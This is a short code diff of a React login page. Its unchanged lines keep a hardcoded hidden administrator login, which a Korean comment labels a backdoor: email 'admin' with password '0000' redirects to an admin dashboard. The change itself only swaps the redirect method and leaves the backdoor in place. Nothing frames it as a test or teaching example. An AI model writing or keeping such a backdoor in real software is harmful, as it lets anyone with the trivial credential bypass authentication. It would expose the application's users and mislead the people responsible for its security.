@@ -20,7 +20,7 @@ export default function LoginPage() {
 
     // 숨겨진 관리자 접속 (백도어)
     if (email === 'admin' && password === '0000') {
-      router.push('/dashboard?admin=true');
+      window.location.href = '/dashboard?admin=true';
       return;
     }
 
